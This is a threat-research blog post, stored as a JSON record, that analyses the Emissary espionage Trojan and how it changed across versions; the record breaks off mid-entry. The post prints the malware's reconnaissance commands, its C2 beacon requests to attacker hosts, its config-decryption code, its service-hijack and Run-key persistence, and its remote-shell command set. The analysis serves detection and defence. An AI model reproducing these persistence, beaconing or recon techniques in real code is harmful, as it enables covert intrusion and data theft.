{
    "id": "b710d376-32c1-4907-9b69-b4b0b770ff86",
    "created_at": "2022-10-25T16:48:16.228574Z",
    "updated_at": "2025-03-27T02:13:48.701109Z",
    "deleted_at": null,
    "sha1_hash": "72b119031cde0a78ff6f778c6b8670f4d1f86b16",
    "title": "Emissary Trojan Changelog: Did Operation Lotus Blossom Cause It to Evolve? - Palo Alto Networks Blog",
    "authors": "",
    "file_creation_date": "2016-10-31T18:01:51Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 385106,
    "plain_text": "### MENU\n\n\n**[Blog Home > Malware > Emissary Trojan Changelog: Did Operation Lotus Blossom Cause It to](http://researchcenter.paloaltonetworks.com/)**\n**Evolve?**\n\n# Emissary Trojan Changelog: Did Operation Lotus Blossom Cause It to Evolve?\n\n**[By Robert Falcone and Jen Miller-Osborn](http://researchcenter.paloaltonetworks.com/author/robert-falcone/)**\n**February 3, 2016 at 11:00 AM**\n**[Category: Malware, Threat Prevention, Unit 42](http://researchcenter.paloaltonetworks.com/malware-2/)**\n\n**203**\n\n**161**\n\n**[In December 2015, Unit 42 published a blog about a cyber espionage attack using the Emissary](http://researchcenter.paloaltonetworks.com/2015/12/attack-on-french-diplomat-linked-to-operation-lotus-blossom/)**\n**[Trojan as a payload. Emissary is related to the Elise Trojan and the Operation Lotus Blossom attack](http://researchcenter.paloaltonetworks.com/2015/06/operation-lotus-blossom/)**\n**campaign, which prompted us to start collecting additional samples of Emissary.**\n\n**The oldest sample we found was created in 2009, indicating this tool has been in use for almost**\n**seven years. Of note, this is three years earlier than the oldest Elise sample we have found,**\n**suggesting this group has been active longer than previously documented. In addition, Emissary**\n**appears to only be used against Taiwanese or Hong Kong based targets, all of the decoys are**\n**written in Traditional Chinese, and they use themes related to the government or military.**\n\n**We also found several different versions of Emissary that had several iterative changes that show�**\n**how the Trojan evolved over the years. One of the most interesting observations made during this**\n**analysis is that the amount of development effort devoted to Emissary significantly increased after�**\n**[we published our Operation Lotus Blossom report in June 2015, resulting in many new versions of](http://researchcenter.paloaltonetworks.com/2015/06/operation-lotus-blossom/)**\n**the Emissary Trojan. In addition, we observed a TTP shift post publication with regards to their**\n**malware delivery; they started using compromised but legitimate domains to serve their malware.**\n**Interestingly, the C2 infrastructure is also somewhat different than that used by Elise.�**\n\n## Targeting\n\n**In contrast to Elise, which was used in attacks against multiple Southeast Asian countries in region**\n**appropriate languages, all of the Emissary decoys we’ve collected are written in Traditional Chinese,**\n**which is used primarily in Taiwan and Hong Kong. The targets we have identified are also limited to�**\n**those two regions. Despite appearing to target a more limited geographical range, Emissary**\n**targeted the government, higher education, and high tech companies with a mix of copy and pasted**\n**news articles and documents that do not appear to be available online. Decoys include:**\n\n**An Excel spreadsheet containing legitimate contact information for much of the Taiwanese**\n**government that does not appear to be available online.**\n\n\n-----\n\n**Taiwan scholar saying the odds of China and Taiwan reuniting is low and discussing the issues**\n**with an attempted military takeover.**\n**Copy of a news article from 2010 about the Chinese League of Victims protesting the**\n**involuntary removal of Shanghai residents in the lead up to the Shanghai Expo.**\n**Copy of the official Taiwan holiday schedule for 2016, which is the 105� anniversary of theth**\n**current Taiwanese government.**\n\n**Figure 1: Partial screenshot of the response from Deputy Commander of the Nanjing Military Region**\n\n**Wang Huangguang.**\n\n## Evolve to Survive: TTP Shifts and Infrastructure\n\n**We’ve expanded our knowledge of Emissary infrastructure significantly since our first Emissary blog�**\n**and we’ve found almost exclusive use of Dynamic DNS (DDNS) domains with only one purchased**\n**from a Chinese reseller. In contrast, the Elise samples used a mix of actor-registered and DDNS,**\n**with the actor-registered serving as one of the data points we used to tie all of the activity together.**\n**While the use of DDNS can make tying activity together more difficult, and despite the new�**\n**Emissary variants since our publication, two of the most recent C2s resolved to IPs used by Elise**\n**C2s detailed in Operation Lotus Blossom. The Emissary samples typically have three hardcoded**\n**C2s that are a mix of IPs and domain names, with one of the domains or IPs not being used by the**\n**other three C2s in a likely effort to avoid loss of control. A full IOC list is included at the end of this�**\n**report.**\n\n**Also new is the actors’ use of compromised legitimate Taiwanese websites to serve their malware,**\n**including the official website of the Democratic Progressive Party. This is particularly interesting as�**\n**Taiwan just held a closely watched Presidential election on 16 January where DPP candidate Tsai**\n**Ing-wen won. This marked the first time a woman was elected President of Taiwan and only the�**\n**second time a member of the Kuomintang did not hold the office since being ousted from China in�**\n**1949 when the Communist Party of China took power. In line with her party’s stance, she is widely**\n**seen as a proponent of an independent Taiwan and not in favor of reunification with the People’s�**\n\n\n-----\n\n## p\n\n**Our evidence suggests that malware authors created Emissary as early as 2009, which suggests**\n**that threat actors have relied on this tool as a payload in cyber-espionage attacks for many years.**\n**The Emissary Trojan is a capable tool to gain a foothold on a targeted system. While it lacks more**\n**advanced functionality like screen capturing, it is still able to carry out most tasks desired by threat**\n**actors: exfiltration of files, ability to download and execute additional payloads, and gain remote�**\n**shell access. It appears that threat actors have continually used this Trojan, and developed several**\n**updated versions of Emissary to remain undetected and fresh over time.**\n\n**We analyzed all of the known Emissary samples to determine what changes the malware author**\n**made between the different versions of the Trojan. During our analysis, we examined when each�**\n**sample was created based on its compile time and produced a simple timeline, seen in Figure 2, to**\n**display the development efforts expended on the Emissary Trojan. It should be noted that we know�**\n**some Emissary samples have been used multiple times with different configurations, so the timeline�**\n**only shows when development activity took place on Emissary and should not be misconstrued to**\n**when Emissary was used in attacks.**\n\n**The timeline in Figure 2 shows that the Emissary Trojan was first created (version 1.0) in May 2009�**\n**and quickly received an update that resulted in version 1.1 in June 2009. The Trojan did not receive**\n**much in the form of updates until September 2011 when the author released version 2.0. Version 2.0**\n**received one update in October 2013 before the malware author released version 3.0 in December**\n**2014. The malware author released version 4.0 in March 2015, but curiously created a version 3.0**\n**sample afterwards on June 26, 2015, which was out-of-sequence from the incrementing versioning.**\n**Between August and November 2015 the malware author creates several new versions of Emissary,**\n**specifically 5.0, 5.1, 5.3 and 5.4 in a much more rapid succession compared to development�**\n**process in earlier versions.**\n\n\n-----\n\n-----\n\n**Figure 2: Timeline of development efforts spent on Emissary�**\n\n**The out-of-sequence version 3.0 appears to be an early variant of version 5.0 based on significant�**\n**similarities (discussed in the changelog section) that are not seen in the original version 3.0 and**\n**other earlier versions of Emissary. One campaign code associated with of the out-of-sequence**\n**version 3.0 sample was “3test”, suggesting the malware author created it for testing purposes. The**\n**other campaign code associated with the out-of-sequence sample was “IC00001”, which could**\n**denote an attack payload as it appears to be a plausible code to describe a campaign.**\n\n**While this may be coincidental, the out-of-sequence version 3.0 sample was created ten days after**\n**[we published the Operation Lotus Blossom paper that exposed the Elise Trojan that is closely](http://researchcenter.paloaltonetworks.com/2015/06/operation-lotus-blossom/)**\n**related to Emissary. It is possible that the threat actors were prompted to make malware changes in**\n**response to our research. Regardless of causation, the rapid development of new versions of**\n**Emissary suggests that the malware authors are making frequent modifications to evade detection,�**\n**which as a corollary suggests the threat actors are actively using the Emissary Trojan as a payload**\n**in attacks.**\n\n## Emissary Changelog\n\n**In this section, we discuss the changes observed between each version of Emissary. As this section**\n**is focused on changes, the features and functionality are the same between Emissary versions**\n**unless otherwise mentioned.**\n\n#### Version 1.0\n\n**Date: 5/12/2009**\n\n\n-----\n\n**Name: WUMsvc.dll**\n\n**Initial Release**\n\n**The initial loader Trojan writes Emissary to %SYSTEM%\\WSPsvc.dll and installs it as a service,**\n**which will run the exported function “ServiceMain” within the Emissary Trojan to carry out its**\n**functionality.**\n\n**Configuration data is stored in the last 1024 bytes of the payload, from which the Trojan will extract�**\n**an 896 byte structure. The configuration is decrypted with an algorithm that uses the XOR operation�**\n**on each byte using the value at a different offset within the ciphertext.�**\n\n**The code will create the following registry keys:**\n\n\n**1**\n**2**\n\n\n**HKEY_CLASSES_ROOT\\Shell.LocalServer\\CheckCode**\n**HKEY_CLASSES_ROOT\\Shell.LocalServer\\CheckID**\n\n\n**Emissary uses the “CheckCode” registry key to store the encrypted configuration for the Trojan,�**\n**while it stores a GUID that Emissary uses to uniquely identify the compromised host in the**\n**“CheckID” key.**\n\n**The malware performs initial system information gathering and saves data to a file named�**\n**TMP2548. The initial gathering relies on a combination of the following commands executed by the**\n**command prompt:**\n\n\n**1**\n**2**\n**3**\n**4**\n**5**\n**6**\n**7**\n**8**\n**9**\n**10**\n**11**\n**12**\n**13**\n**14**\n**15**\n**16**\n\n\n**commands executed by the command prompt:**\n\n**ECHO VER**\n**VER**\n**ECHO IPCONFIG /ALL**\n**IPCONFIG /ALL**\n**ECHO NET LOCALGROUP ADMINISTRATORS**\n**NET LOCALGROUP ADMINISTRATORS**\n**ECHO NET START**\n**NET START**\n**ECHO GPRESULT /Z**\n**GPRESULT /Z**\n**ECHO GPRESULT         /SCOPE COMPUTER /Z**\n**GPRESULT           /SCOPE COMPUTER /Z**\n**ECHO SYSTEMINFO**\n**SYSTEMINFO**\n\n\n**Emissary parses command and control responses for “instru”, which will precede a GUID value that**\n**designates the command the C2 server wishes to execute on the system. The command handler**\n**does not use a nested if/else or switch statement like most malware families, instead Emissary**\n**creates a structure that contains all of the available command GUIDs that it will iterate through each**\n**time the C2 supplies a GUID in order to determine which command the operator wishes to execute.**\n**Emissary can include up to 32 different commands within this data structure, but it appears the�**\n**author has decided to include six commands within the Trojan. The following denotes the command**\n**handler structure used by Emissary v1.0:**\n\n\n-----\n\n**3**\n**4**\n**5**\n**6**\n**7**\n**8**\n**9**\n**10**\n**11**\n**12**\n**13**\n**14**\n**15**\n**16**\n**17**\n**18**\n**19**\n**20**\n\n\n**CHAR** **guid[40];**\n**DWORD sub_function;**\n**DWORD arg1_subfunction;**\n**DWORD arg2_subfunction;**\n**DWORD arg3_subfunction;**\n**};**\n\n**struct** **commandHandler**\n**{**\n**DWORD number_of_commands;**\n**DWORD unused;**\n**struct** **EMISSARY_COMMAND cmd_0;**\n**struct** **EMISSARY_COMMAND cmd_1;**\n**struct** **EMISSARY_COMMAND cmd_2;**\n**struct** **EMISSARY_COMMAND cmd_3;**\n**struct** **EMISSARY_COMMAND cmd_4;**\n**struct** **EMISSARY_COMMAND cmd_5;**\n**};**\n\n\n**Table 1 contains the commands available within the Emissary v1.0 command handler.**\n\n**Command** **Description**\n\n**bac84b12-5b0b-491f-** **Upload file.�**\n**a885-8667d156394f**\n\n**3d8313cc-53ca-4751-bbbf-** **Download file.�**\n**ea5f914f8e65**\n\n**db0e93e7-b46c-4cba-** **Update config. C2 specifies files as: p1�**\n**81f1-ec70da57dc19** **= C2 server 1, p2 = C2 server 2, p3 =**\n\n**C2 server 3, p4 = Sleep Interval, p5 =**\n**System Identifier (computer name), p6�**\n**= GUID for beacon.**\n\n**2e382e51-3089-4293-** **Executes a specified command.�**\n**8454-5eccb253eb54**\n\n**a57db08a-bf97-4b43-** **Create remote shell.**\n**b27d-157e62e2fd74**\n\n**eab5c1ab-a497-4fc2-bbe0-** **Update Trojan with new executable.**\n**049be45d6f2d**\n\n**Table 1: Emissary command handler**\n\n**The Emissary version 1.0 beacon to the C2 server appears as follows:**\n\n|Command|Description|\n|---|---|\n|bac84b12-5b0b-491f- a885-8667d156394f|Upload file.�|\n|3d8313cc-53ca-4751-bbbf- ea5f914f8e65|Download file.�|\n|db0e93e7-b46c-4cba- 81f1-ec70da57dc19|Update config. C2 specifies files as: p1� = C2 server 1, p2 = C2 server 2, p3 = C2 server 3, p4 = Sleep Interval, p5 = System Identifier (computer name), p6� = GUID for beacon.|\n|2e382e51-3089-4293- 8454-5eccb253eb54|Executes a specified command.�|\n|a57db08a-bf97-4b43- b27d-157e62e2fd74|Create remote shell.|\n|eab5c1ab-a497-4fc2-bbe0- 049be45d6f2d|Update Trojan with new executable.|\n\n\n**1**\n**2**\n**3**\n\n\n**GET /VSNET/default.aspx HTTP/1.1**\n**User-Agent: Mozilla/4.0**\n**Host: 193 34 144[ ]21**\n\n\n-----\n\n**SHA256: e6c4611b1399ada920730686395d6fc1700fc39add3d0d40b4f784ccb6ad0c30, Original**\n**Name: WUMsvc.dll**\n\n**Removed checks for “//” and “/” in the update configuration command when updating the three C2�**\n**servers.**\n\n#### Version 1.1\n\n**Date: 6/5/2009**\n\n**SHA256: 931a1284b11a3997c7a99076d582ed3436aa30409dc73bd763436dddd490f9cb**\n\n**Original Name: WUMsvc.dll**\n\n**Bug fixes:�**\n\n**Added code to make sure the content received from the C2 server matches the “Content-**\n**Length” value in the HTTP response.**\n**Code added to allow for the download of more than 524,288 bytes.**\n\n**The Emissary v1.1 C2 beacon appears as follows, which has not changed since version 1.0:**\n\n\n**1**\n**2**\n**3**\n**4**\n\n\n**GET /eng/comfunc/comfunc/default.aspx HTTP/1.1**\n**User-Agent: Mozilla/4.0**\n**Host: 137.189.145.1**\n**Cookie: guid=af44f802-ba5c-4b3c-8c6b-2ea411058678;** **op=1635b097-ffe4-4711-89e6-7f8c7f4cdca6**\n\n\n#### Version 2.0\n\n**Date: 9/15/2011**\n\n**SHA256: 5edf2d0270f8e7eb5be3476802e46c578c4afc4b046411be0806b9acc3bfa099 Original**\n**Name: EmissaryDll.dll**\n\n**Version 2.0 was a significant re-write of the Emissary Trojan.�**\n\n**The configuration data for the Trojan is still saved to the registry, but the registry key has changed�**\n**to:**\n\n\n**1** **SOFTWARE\\Microsoft\\VBA\\VbaData**\n\n\n**The configuration structure also changed in size to 464 bytes. The Emissary configuration is now�**\n**encrypted using a custom algorithm that uses the “srand” function to seed the “rand” function using**\n**a value of 2563. This seed value causes the “rand” function to generate the same values each time,**\n**which Emissary will use as a key along with the XOR operation. The configuration now contains the�**\n**version number of Emissary, instead of the version being hardcoded into the Trojan.**\n\n**This version of Emissary keeps track of which C2 location within its configuration that it has been�**\n**communicating with by storing the index of the C2 server (1, 2, or 3) in the following registry key:**\n\n\n**1** **SOFTWARE\\Microsoft\\VBA\\VbaList**\n\n\n**This version of Emissary moves away from the command handler using the structure and moves to**\n**a nested if/else statement for less complicated command handling; however, the command GUID**\n**and commands themselves are unchanged.**\n\n**The Emissary version 2.0 beacon changed slightly from previous versions, specifically the removal�**\n**of the User-Agent field and the use of a lowercase “h” in the “Host” field. The following is an�**\n**example of the version 2.0 beacon, which contains the same GUID and “op” values:**\n\n\n-----\n\n**3** **Cookie: guid=af44f802-ba5c-4b3c-8c6b-2ea411058678;** **op=1635b097-ffe4-4711-89e6-7f8c7f4cdca6;**\n\n\n**Version 2.0 also introduces a debug message logging system that includes verbose error messages**\n**that are accompanied by an error ID number. Error messages are written to the file�**\n**%TEMP%\\em.log. The following is a list of all possible debug messages:**\n\n\n-----\n\n**3**\n**4**\n**5**\n**6**\n**7**\n**8**\n**9**\n**10**\n**11**\n**12**\n**13**\n**14**\n**15**\n**16**\n**17**\n**18**\n**19**\n**20**\n**21**\n**22**\n**23**\n**24**\n**25**\n**26**\n**27**\n**28**\n**29**\n**30**\n**31**\n**32**\n**33**\n**34**\n**35**\n**36**\n**37**\n**38**\n**39**\n**40**\n**41**\n**42**\n**43**\n**44**\n**45**\n**46**\n**47**\n**48**\n**49**\n**50**\n**51**\n**52**\n**53**\n**54**\n**55**\n**56**\n**57**\n**58**\n**59**\n**60**\n**61**\n**62**\n**63**\n**64**\n\n\n**emissarydll.cpp - 0x35 - InitApp() - Event create successful**\n**emissarydll.cpp - 0x3b - InitApp() - create work thread**\n**shell.cpp - 0x30 - SendShellOutputThread - PeekNamedPipe - Error : 0x%08x**\n**shell.cpp - 0x3e - SendShellOutputThread() : Timeout**\n**shell.cpp - 0x53 - SendShellOutputThread - ReadFile - Error : 0x%08x**\n**shell.cpp - 0x5b - SendShellOutputThread - send - Error : 0x%08x**\n**shell.cpp - 0x62 - SendShellOutputThread() : thread exit**\n**shell.cpp - 0x7f - RecvShellCmdThread - recv - Error : 0x%08x**\n**shell.cpp - 0x89 - RecvShellCmdThread - WriteFile - Error : 0x%08x**\n**shell.cpp - 0x8f - RecvShellCmdThread() : thread exit**\n**shell.cpp - 0xeb - Error occured : %s** **[%d]**\n**shell.cpp - 0xfa - TerminateThread Input Thread**\n**shell.cpp - 0x100 - TerminateThread Output Thread**\n**shell.cpp - 0x118 - SocketShell - Fail To** **Create Reverse Socket**\n**shell.cpp - 0x12f - SocketShell - Fail To** **Generate Reverse Shell**\n**shell.cpp - 0x13a - SocketShell - SocketShell - Fail To** **Generate Reverse Shell**\n**shell.cpp - 0x13e - SocketShell - Create Reverse Shell Thread OK**\n**config.cpp - 0x38 - RegCreateKeyEx error : %0x08x**\n**config.cpp - 0x46 - RegSetValueEx error : %0x08x**\n**config.cpp - 0x5e - ReadConfig - RegCreateKeyEx error : 0x%08x**\n**config.cpp - 0x66 - ReadConfig - RegQueryValueEx error : 0x%08x**\n**config.cpp - 0xab - find user: %s**\n**config.cpp - 0xbc - can not** **find proxy**\n**config.cpp - 0xc7 - get ProxySetting failed**\n**config.cpp - 0xd4 - find proxy server : %s**\n**run.cpp -   0x75 - InitConfig: [g_ServerPath:%s]** **[g_ServerName:%s]** **[g_port:%d]** **[g_ServerUrl:%**\n**run.cpp - 0x9d - InitConfig: [g_DelayTime:%d]**\n**run.cpp - 0xbe - get proxy the last time used:%s**\n**run.cpp - 0xc3 - server index:%d**\n**run.cpp - 0xd9 - RetryTimes = %d**\n**run.cpp - 0xec - connect %s** **error :%s**\n**run.cpp - 0x10c - process** **a** **request ok.**\n**httpclient.cpp - 0x98 - ASP.NET_SessionId⻓度[异常]:[%d][%s]** **(translation: ASP.NET_SessionId Length**\n**httpclient.cpp - 0xd0 - ******not** **connected !**\n**httpclient.cpp - 0xf4 - read hread error : %s**\n**httpclient.cpp - 0x102 - body length = 0**\n**httpclient.cpp - 0x13d - decrypt error\"**\n**httpclient.cpp - 0x211 - instruction : <instruction>**\n**httpclient.cpp - 0x21d - no instruction guid**\n**httpclient.cpp - 0x22c - OP_DOWNLOAD no local file name**\n**httpclient.cpp - 0x23b - OP_UPLoad no local file name**\n**httpclient.cpp - 0x249 - OP_UPLoad no local file name**\n**httpclient.cpp - 0x242 - OP_UPLoad no local file name**\n**httpclient.cpp - 0x25b - OP_EXECUTE no cmd list**\n**httpclient.cpp - 0x262 - OP_EXECUTE no timeout**\n**httpclient.cpp - 0x2b4 - OP_SHELL ip**\n**httpclient.cpp - 0x2bb - OP_SHELL port**\n**httpclient.cpp - 0x2dd - OP_CHANGECONFIG server1**\n**httpclient.cpp - 0x2e4 - OP_CHANGECONFIG server2**\n**httpclient.cpp - 0x2eb - OP_CHANGECONFIG server3**\n**httpclient.cpp - 0x2f2 - OP_CHANGECONFIG timestr**\n**httpclient.cpp - 0x2f9 - OP_CHANGECONFIG namestr**\n**httpclient.cpp - 0x300 - OP_CHANGECONFIG guid**\n**httpclient.cpp - 0x321 - not** **connected**\n**httpclient.cpp - 0x361 - send msg error**\n**httpdoinstruction.cpp - 0x28 - DownloadFile - LocalFileName=%s**\n**httpdoinstruction.cpp - 0x5c - download file http head:%s**\n**httpdoinstruction.cpp - 0x7a - download file ok**\n**httpdoinstruction.cpp - 0xac - UploadFile - LocalFileName=%s**\n**httpdoinstruction.cpp - 0xb4 - DownloadFile - Error - Open File** **[%S][0x%08x]**\n**httpdoinstruction.cpp - 0xc7 - UploadFile:TotalLength=%d**\n**httpdoinstruction.cpp - 0x124 - download file http head:%s**\n\n\n**Date: 10/24/2013**\n\n**SHA256: 9dab2d1b16eb0fb4ec2095d4b4e2a3ad67a707ab4f54f9c26539619691f103f3**\n\n**Original Name: NetPigeon DLL dll**\n\n\n-----\n\n**settings for the Emissary service, which the Trojan will store in and access from the following registry**\n**keys:**\n\n**SOFTWARE\\Microsoft\\VBA\\Serv -> Service Name**\n\n**SOFTWARE\\Microsoft\\VBA\\VbaList -> Binary Path for the Service**\n\n**Also, this version of Emissary was created using Microsoft Foundation Classes (MFC) to carry out a**\n**majority of its functionality. For instance, instead of manually building an HTTP request as in**\n**previous versions, this version uses the MFC functions to create the HTTP request and send it to**\n**the C2 server:**\n\n**CInternetSession::CInternetSession**\n**CInternetSession::GetHttpConnection**\n**CHttpConnection::OpenRequest**\n**CHttpFile::AddRequestHeaders**\n**CInternetSession::SetCookie**\n**CHttpFile::SendRequest**\n\n**Using these classes creates a significantly different HTTP request sent to the C2 server, but the�**\n**functionality of obtaining instructions from the C2 is the same. The following is an example of a**\n**beacon generated by this sample, which contains the same “op” value and has additional fields�**\n**within the HTTP header:**\n\n\n**1**\n**2**\n**3**\n**4**\n**5**\n\n\n**GET /lightserver/Default.aspx HTTP/1.0**\n**Cache-Control: no-cache**\n**User-Agent: Mozilla/4.0** **(compatible;** **MSIE** **7.0;** **Windows NT** **5.1)**\n**Host: groupspace.findhere.org**\n**Cookie: guid=8E550BBD-F5DB-4471-BBC7-E8768BD5003E;** **op=1635b097-ffe4-4711-89e6-7f8c7f4cdca6**\n\n\n**The logging functionality within this update no longer includes error ID values, but still contains**\n**verbose debug messages that are written to a file named %TEMP%\\msmqinst.ax.�**\n\n#### Version 3.0\n\n**Date: 12/24/2014**\n\n**SHA256: dcbeca8c92d6d18f2faf385e677913dc8abac3fa3303c1f5cfe166180cffbed3�**\n\n**Original Name: Generic.dll**\n\n**Bug fixes:�**\n\n**Added a function to the configuration update command that checks to see if the C2 provided�**\n**a new sleep interval at offset 460 and uses the interval stored in the VbaData registry key if its�**\n**missing. This fixes the bug that would not allow the sleep interval to update correctly.�**\n\n#### Version 4.0\n\n**Date: 3/26/2015**\n\n**SHA256: 5171c9a593389011da4d72125e52bf7ef86b2da7fcd6c2a2bc95467afe6a1b58**\n\n**Original Name: Generic.dll**\n\n**This version of Emissary includes both the installation and loading functionality along with the**\n**Emissary functional code in the same file. The installation and loading portion of the Trojan is called�**\n**using an exported function named “Setting”, which moves the file to:�**\n\n\n-----\n\n**installs Emissary as a service or as a standalone Trojan. To install as a service, the loader will**\n**enumerate the services on the system looking for services running under the “netsvcs” group, and it**\n**will attempt to hijack the first “netsvcs” service by replacing the “ServiceDLL” parameter to point to�**\n**the Emissary DLL. For instance, during the analysis period, the installation code changed the**\n**following registry key of the AppMgmt:**\n\n**1** **HKLM\\SYSTEM\\CurrentControlSet\\Services\\AppMgmt\\Parameters\\ServiceDll: \"%SystemRoot%\\System32\\appm**\n\n**to**\n\n\n**1** **HKLM\\SYSTEM\\CurrentControlSet\\Services\\AppMgmt\\Parameters\\ServiceDll: \"C:\\DOCUME~1\\ADMINI~1\\LOCA**\n\n\n**If the user does not have permissions to add a service, the installation routine attempts to add**\n**persistence by creating the following registry key that will run the functional code within Emissary**\n**via an exported function named “DllRegister”:**\n\n\n**1** **Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Resolves: \"Rundll32.exe C:\\DOCUME~1\\ADMINI~1\\LOCAL**\n\n\n**This version of emissary has its configuration appended to the end of the DLL, specifically starting�**\n**at offset 0xc600. The following code accesses the configuration embedded within the DLL and�**\n**decrypts it using a single byte XOR algorithm using 65 as the key:**\n\n\n**1**\n**2**\n**3**\n**4**\n**5**\n**6**\n\n\n**SetFilePointer(v2,** **0xC600,** **0,** **0);**\n**ReadFile(h_emissary_dll_file,** **buffer_for_config,** **0x1D0u, &NumberOfBytesRead,** **0);**\n**iteration_count = 0;**\n**do**\n***(iteration_count++ + buffer_for_config) += 65;**\n**while** **(** **iteration_count < 0x1D0** **);**\n\n\n**This algorithm differs from the algorithm introduced in Emissary version 2.0 that used the srand and�**\n**rand functions to generate a key to use in conjunction with the XOR operation. With the**\n**configuration embedded within the Emissary DLL, each Emissary version 4.0 sample will have a�**\n**different hash as the configuration data changes.�**\n\n**The network beacon sent from Emissary version 4.0 is the same as other previous versions starting**\n**at version 2.0, as seen in the following:**\n\n\n**1**\n**2**\n**3**\n**4**\n**5**\n\n\n**GET /lightserver/Default.aspx HTTP/1.0**\n**Cache-Control: no-cache**\n**User-Agent: Mozilla/4.0** **(compatible;** **MSIE** **7.0;** **Windows NT** **5.1)**\n**Host: 210.209.121.92**\n**Cookie: guid=7DA53AE4-C155-40b3-8EB3-60C4FCE99025;** **op=1635b097-ffe4-4711-89e6-7f8c7f4cdca6**\n\n\n#### Version 3.0: Out-of-sequence\n\n**Date: 6/25/2015**\n\n**SHA256: 70bed57bc3484fe5dbcf3c732bd7b11f80a742138f4733bc7e9b6d03e721da4a**\n\n**Original Name: IISDLL.dll**\n\n**Major Overhaul**\n\n**The compilation time of one sample of Emissary version 3.0 on June 25, 2015 appears out of order,**\n**as it occurs after the compilation of Emissary version 4.0. The differences between this out of order�**\n**sample compared to the other known version 3.0 sample, as well as version 4.0 for that matter,**\n**include a dramatic change in configuration storage and the handling of commands. Also, the files�**\n**stored on the system have different names than Emissary versions in the past, which are:�**\n\n\n-----\n\n**3**\n**4**\n**5**\n\n\n**%APPDATA%\\LocalData\\75BD50EC.DAT -> Configuration** **file**\n\n**%APPDATA%\\LocalData\\A08E81B411.DAT -> Emissary DLL**\n\n\n**This version of Emissary is designed to be injected into an Internet Explorer process by its**\n**associated loader Trojan, which marks the first time Emissary executes through DLL injection.�**\n\n**This version of Emissary also has a different configuration structure than prior versions. The�**\n**configuration is no longer stored in the registry; rather it is saved to a file named 75BD50EC.DAT.�**\n**The Emissary DLL will skip to offset 0x488 within this file and read the next 132 bytes, which it will�**\n**decrypt with a new algorithm as seen in the following:**\n\n\n**1**\n**2**\n**3**\n**4**\n**5**\n**6**\n**7**\n**8**\n\n\n**SetFilePointer(h_config_file_1,** **0x488,** **0,** **0);**\n**ReadFile(h_config_file,** **buffer_for_config,** **132u, &NumberOfBytesRead,** **0);**\n**CloseHandle(h_config_file);**\n**srand(0xA03u);**\n**iteration_count = 0;**\n**do**\n***(buffer_for_config + iteration_count++) ^= rand() % 128;**\n**while** **(** **iteration_count < 0x84** **);**\n\n\n**The configuration structure has also changed as well, with Emissary now using the following�**\n**structure:**\n\n\n**1**\n**2**\n**3**\n**4**\n**5**\n**6**\n**7**\n**8**\n**9**\n**10**\n**11**\n**12**\n\n\n**struct** **emissary_new_config** **{**\n**WORD** **Emissary_version_major;**\n**WORD** **Emissary_version_minor;**\n**CHAR[36]** **GUID_for_sample;**\n**WORD** **Unknown1;**\n**CHAR[128]** **Server1;**\n**CHAR[128]** **Server2;**\n**CHAR[128]** **Server3;**\n**CHAR[128]** **CampaignName;**\n**CHAR[550]** **Unknown2;**\n**WORD** **Delay_interval_seconds;**\n**};**\n\n\n**This version of Emissary also introduced a new command handler that uses number-based**\n**commands instead of the GUID commands seen in prior versions of Emissary. The functionality of**\n**the commands are the same, however, the commands themselves are invoked using a number.**\n**Table 2 contains a list of available commands and a brief description of the functionality carried out**\n**by the command.**\n\n**Command** **Description**\n\n**102** **Upload a file to the C2 server.�**\n\n**103** **Executes a specified command.�**\n\n**104** **Download file from the C2 server.�**\n\n**105** **Update configuration file.�**\n\n**106** **Create a remote shell.**\n\n**107** **Updates the Trojan with a new executable.**\n\n|by the command.|Col2|\n|---|---|\n|Command|Description|\n|102|Upload a file to the C2 server.�|\n|103|Executes a specified command.�|\n|104|Download file from the C2 server.�|\n|105|Update configuration file.�|\n|106|Create a remote shell.|\n\n\n-----\n\n**in Emissary version 2.0; however, the “op” value of “101” is hardcoded for the beacon and replaces**\n**the GUID based op designator to match the new command handler. The following is an example of**\n**the network beacon generated by this version of Emissary:**\n\n\n**1**\n**2**\n**3**\n**4**\n**5**\n\n\n**GET /default.aspx HTTP/1.1**\n**User-Agent: Mozilla/4.0** **(compatible;** **MSIE** **7.0;** **Windows NT** **5.1)**\n**Host: 101.55.33.92**\n**Cache-Control: no-cache**\n**Cookie: guid=cae5e213-395a-4023-9a12-f78d3c4718e5;** **op=101**\n\n\n#### Version 5.0\n\n**Date: 8/25/2015**\n\n**SHA256: c145bb2e4ce77c79aa01de2aec4a8b5b0b680e23bceda2c230903b5f0e119634, Original**\n**Name: WinDLL.dll**\n\n**Emissary version 5.0 closely resembles the out-of-order version 3.0 sample, which suggests that**\n**the malware author just forgot to change the version number of the out of order sample. While the**\n**configuration and Emissary DLL filenames used by the version 5.0 Emissary sample are the same as�**\n**the out-of-order version 3.0 sample, the log file name differs but only slightly, as seen in the�**\n**following list of related files:�**\n\n\n**1**\n**2**\n**3**\n**4**\n**5**\n**6**\n**7**\n\n\n**%TEMP%\\000A758C8FEAE5F.TMP -> Log** **File**\n\n**%APPDATA%\\LocalData\\75BD50EC.DAT -> Configuration** **file**\n\n**%APPDATA%\\LocalData\\A08E81B411.DAT -> Emissary** **DLL**\n\n**%APPDATA%\\LocalData\\ishelp.dll -> Loader DLL**\n\n\n**Version 5.0 uses numbers within its command handler and the same configuration structure as the�**\n**out-of-order version 3.0. The only major change in 5.0 is the ability to obtain a compromised**\n**system’s external IP address by performing an HTTP GET request to “http://showip.net/index.php”.**\n**The code will parse the response from this webserver for the following to obtain the system’s IP**\n**address:**\n\n\n**1** **<input id=\"checkip\"** **type=\"text\"** **name=\"check_ip\"** **value=\"[IP address parsed]\" />**\n\n\n**The SID value sent from the C2 server is encrypted using an algorithm that uses the XOR operation**\n**on the data using 0x76 as the key on the first byte and the resulting cleartext byte as the key on the�**\n**next byte and so on. The network beacon sent from this version of Emissary visually resembles the**\n**out-of-order version, with the addition of a field “SHO” that contains the IP address of the�**\n**compromised host. The following is an example of the Emissary version 5.0 network beacon, which**\n**is also the same in versions 5.1, 5.3 and 5.4 as well:**\n\n\n**1**\n**2**\n**3**\n**4**\n**5**\n\n\n**GET /default.aspx HTTP/1.1**\n**User-Agent: Mozilla/4.0** **(compatible;** **MSIE** **7.0;** **Windows NT** **5.1)**\n**Host: 101.55.33.95**\n**Cache-Control: no-cache**\n**Cookie: guid=8cdef38c-808a-4e29-af6e-7386f02d28f1;** **op=101;** **SHO=172.16.107.130**\n\n\n#### Version 5.1\n\n**Date: 9/29/2015**\n\n**SHA256: 